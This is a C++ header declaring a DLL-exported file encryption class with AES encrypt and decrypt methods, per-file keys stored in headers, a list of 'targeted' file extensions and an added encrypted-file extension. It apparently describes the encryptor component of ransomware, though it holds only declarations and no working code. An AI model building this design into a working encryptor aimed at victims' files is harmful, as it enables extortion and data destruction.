#pragma once

#include <string>
#include <fstream>
#include <unordered_set>
#include "CryptoKeyManager.hpp"
#include "..\include\singleton.hpp"

/**
 * @brief Class responsible for file encryption and decryption processes.
 */
class FileEncrypter final : public Singleton<FileEncrypter>
{
	friend class __declspec(dllexport) Singleton<FileEncrypter>;
	__declspec(dllexport) FileEncrypter();

public:
	__declspec(dllexport) ~FileEncrypter();

	/**
	 * @brief Initializes the File Encrypter with a Crypto Key Manager.
	 *
	 * @param keyMgr Reference to CryptoKeyManager object.
	 */
	__declspec(dllexport) void init(CryptoKeyManager* keyMgr);

	/**
	 * @brief Encrypts a file at the given path.
	 *
	 * @param path Path to the file to be encrypted.
	 * @return true If the encryption was successful.
	 * @return false If the encryption failed.
	 */
	__declspec(dllexport) bool encryptFile(const char* path);

	/**
	 * @brief Decrypts a file at the given path.
	 *
	 * @param path Path to the file to be decrypted.
	 * @return true If the decryption was successful.
	 * @return false If the decryption failed.
	 */
	__declspec(dllexport) bool decryptFile(const char* path);

	/**
	 * @brief Computes and returns the SHA-256 hash of a file.
	 *
	 * @param path Path to the file.
	 * @return std::string The SHA-256 hash of the file.
	 */
	__declspec(dllexport) bool computeFileSHA256(const char* path, std::string* hashOut);

	/**
	* @brief Returns the set of file extensions that are targeted by the File Encrypter.
	*
	* @return const std::unordered_set<std::string>& Set of file extensions.
	*/
	__declspec(dllexport) const std::unordered_set<std::string>& getTargetFileExtensions() const;

	/**
	* @brief Returns the file extension that is added to the encrypted files.
	* 
	* @return const std::string& File extension.
	*/
	__declspec(dllexport) const std::string& getEncryptedFileExtension() const;

private:
	/**
	 * @brief Encrypts the data using AES.
	 *
	 * @param data Pointer to the data to be encrypted.
	 * @param aes AES key structure.
	 * @return true If the data was successfully encrypted.
	 * @return false If the encryption failed.
	 */
	bool encryptData(std::vector<unsigned char>* data, const CryptoKeyManager::AESKey& aes);

	/**
	 * @brief Decrypts the data using AES.
	 *
	 * @param data Pointer to the data to be decrypted.
	 * @param aes AES key structure.
	 * @return true If the data was successfully decrypted.
	 * @return false If the decryption failed.
	 */
	bool decryptData(std::vector<unsigned char>* data, const CryptoKeyManager::AESKey& aes);

	/**
	 * @brief Adds a header to the file.
	 *
	 * @param file Output file stream.
	 * @param aes AES key structure.
	 * @return true If the header was successfully added.
	 * @return false If adding the header failed.
	 */
	bool addFileHeader(std::ofstream& file, CryptoKeyManager::AESKey& aes);

	/**
	 * @brief Extracts AES key from the file header.
	 *
	 * @param file Input file stream.
	 * @param aes Pointer to AES key structure where the key will be stored.
	 * @return true If the key was successfully extracted.
	 * @return false If extracting the key failed.
	 */
	bool extractAesFromHeader(std::ifstream& file, CryptoKeyManager::AESKey* aes);

	/**
	 * @brief Checks if the file is already encrypted.
	 *
	 * @param file Input file stream.
	 * @return true If the file is already encrypted.
	 * @return false If the file is not encrypted.
	 */
	bool isAlreadyEncrypted(std::ifstream& file);

	/**
	 * @brief Validates the file at the given path.
	 *
	 * @param path Path to the file.
	 * @return true If the file is valid.
	 * @return false If the file is invalid.
	 */
	bool isFileValid(const std::string& path);
};

